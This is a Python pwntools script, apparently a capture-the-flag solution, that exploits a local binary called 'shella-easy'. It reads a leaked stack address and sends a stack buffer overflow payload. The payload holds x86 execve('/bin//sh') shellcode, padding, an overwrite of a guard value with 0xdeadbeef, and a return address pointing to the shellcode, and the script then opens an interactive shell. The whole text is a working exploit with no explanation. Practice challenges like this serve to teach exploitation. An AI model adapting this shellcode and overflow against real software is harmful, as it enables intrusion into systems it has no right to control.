from pwn import *

p = process('./shella-easy')


p.recvuntil(b"Yeah I'll have a ")
addr = p.recvuntil(b" ")[:-1]

shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

p.recvuntil(B"thanks")

payload = shell
payload += b"A" * (0x40- len(shell))
payload += p32(0xdeadbeef)
payload += b"B" * 8
payload += p32(int(addr,16))


p.sendline(payload)
p.interactive()

